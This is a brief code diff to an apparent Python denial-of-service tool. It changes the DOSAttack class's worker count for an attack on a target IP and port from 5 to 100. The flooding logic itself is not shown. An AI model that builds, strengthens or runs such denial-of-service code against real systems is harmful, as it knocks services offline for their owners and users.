@@ -42,7 +42,7 @@ class DOSAttack():
             self._soldiers.remove(soldier)
 
 def attack(target_ip,target_port):
-    dos = DOSAttack(target_ip,target_port,5)
+    dos = DOSAttack(target_ip,target_port,100)
     dos.attack(15)
 
 def main():
